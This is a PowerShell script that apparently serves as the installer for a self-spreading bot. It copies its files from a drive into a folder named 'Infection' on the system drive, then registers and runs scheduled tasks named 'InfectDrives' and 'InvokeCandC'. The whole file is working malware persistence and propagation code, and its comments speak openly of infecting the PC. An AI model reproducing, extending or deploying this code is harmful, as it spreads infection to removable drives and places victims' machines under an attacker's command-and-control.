# The name of the folder where the files for our bot will live
$infectiondir = "Infection"
# Infection Exclusion Flag
$infectionexflag = "Infection.Not"
# System Drive letter
$sysdrive = (Get-ChildItem env:systemdrive).value
# Infection exclusion path
$infectionexpath = Join-Path $sysdrive $infectionexflag
# infection path
$infectionpath = Join-Path $sysdrive $infectiondir
#if the PC isn't infected
if((!(Test-Path $infectionpath)) -and (!(Test-Path $infectionexpath))) {
	# make directory 
	mkdir $infectionpath
	# copy the files from drive to OS disk
	copy "*.*" $infectionpath
	# create Infect-Drives scheduled task and run it
	schtasks /create /xml c:\infection\InfectDrives.xml /tn InfectDrives
	schtasks /run /TN InfectDrives
	# create Invoke-CandC scheduled task and run it
	schtasks /create /xml c:\infection\InvokeCandC.xml /tn InvokeCandC
	schtasks /run /TN InvokeCandC
}
